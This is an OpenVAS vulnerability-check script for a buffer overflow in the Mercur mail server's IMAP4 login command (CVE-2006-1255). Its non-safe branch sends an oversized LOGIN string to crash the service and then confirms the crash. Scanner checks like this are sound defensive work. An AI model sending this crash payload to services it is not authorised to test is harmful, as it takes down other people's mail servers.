# OpenVAS Vulnerability Test
# $Id: mercur_imap_buffer_overflow.nasl 8023 2017-12-07 08:36:26Z teissa $
# Description: Mercur Mailserver/Messaging version <= 5.0 IMAP Overflow Vulnerability
#
# Authors:
# Ferdy Riphagen <f[dot]riphagen[at]nsec[dot]nl>
#
# Copyright:
# Copyright (C) 2006 Ferdy Riphagen
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The Mercur IMAP4 Service is running on the remote host.

Description :

A version of Mercur Mailserver or Messaging Server is installed
on the remote host. It is a complete messaging solution including
common functions like 'smtp/pop3/imap4-server'.

The Mercur IMAP4 Service is vulnerable to buffer overflows
by sending a special crafted 'login' command. 
An attacker can use this to crash the service, possible
execute arbitrary code and gain some access privileges on the system.";

tag_solution = "Filter access to the IMAP4 Service, so that it can be used
by trusted sources only.";

# Original advisory :
# http://archives.neohapsis.com/archives/fulldisclosure/2006-02/1837.html

if (description) {
 script_id(200050);
 script_version("$Revision: 8023 $");
 script_tag(name:"last_modification", value:"$Date: 2017-12-07 09:36:26 +0100 (Thu, 07 Dec 2017) $");
 script_tag(name:"creation_date", value:"2008-08-22 16:09:14 +0200 (Fri, 22 Aug 2008)");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 
 script_bugtraq_id(17138);
 script_cve_id("CVE-2006-1255");
 script_xref(name:"OSVDB", value:"23950");

 name = "Mercur Mailserver/Messaging version <= 5.0 IMAP Overflow Vulnerability";
 script_name(name);

 script_category(ACT_MIXED_ATTACK);
  script_tag(name:"qod_type", value:"remote_banner");
 script_family("Gain a shell remotely");
 script_copyright("This script is Copyright (C) 2006 Ferdy Riphagen");

 script_dependencies("find_service.nasl");
 script_require_ports("Services/imap", 143);
script_tag(name : "solution" , value : tag_solution);
script_tag(name : "summary" , value : tag_summary);
 script_xref(name : "URL" , value : "http://secunia.com/advisories/19267/");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/17138");
 exit(0);
}

include("imap_func.inc");
include("global_settings.inc");

port = get_kb_item("Services/imap");
if (!port) port = 143;
if( ! get_port_state(port) ) exit( 0 );

if (safe_checks()) {
 soc = open_sock_tcp(port);
 if (!soc) exit(0);

 banner = get_imap_banner(port:port);
 if (banner) debug_print("The remote IMAP4 banner is : ", banner, "\r\n");
 if (egrep(pattern:".*MERCUR.*IMAP4.Server.*(v(4\.03|5\.00))", string:banner)) {
 
  report = string("*** OpenVAS did only check for this vulnerability,\n",
	"*** by using the banner of the remote IMAP4 service.\n",
 	"*** This might be a false positive.\n\n"); 
  
  security_message(port:port, data:report);
 }
 if (soc) close(soc);
 exit(0);
}

else {
 soc = open_sock_tcp(port);
 if (!soc) exit(0);

 banner = get_imap_banner(port:port);
 if (banner) debug_print("The remote IMAP4 banner is: ", banner, "\r\n");

 if (egrep(pattern:"OK.*MERCUR IMAP4.Server", string:banner)) {
  exp = string("a0 LOGIN ", crap(data:raw_string(0x41), length:300), "\r\n");
  send(socket:soc, data:exp);

  recv = recv(socket:soc, length:1024);
  if (recv != NULL) debug_print(level: 2, "Response: ", recv, "\r\n");
  close(soc);

  soc = open_sock_tcp(port);
  if (soc) {
   send(socket:soc, data:string("a1 CAPABILITY \r\n"));
   recv2 = recv(socket:soc, length:1024);
   if (recv2 != NULL) debug_print(level: 2, "Response2: ", recv2, "\r\n");
  }
  if (!soc || (!strlen(recv2))) { 
   
   report = string("*** It was possible to crash the MERCUR IMAP4 Service.\n",
	"*** At this time the remote service does not accepting any new requests.\n",
	"*** You should check its state, and possble start it manually again.\n\n"); 
   
   security_message(port:port, data:report);
  }
 }
 if (soc) close(soc);
 exit(0);
}
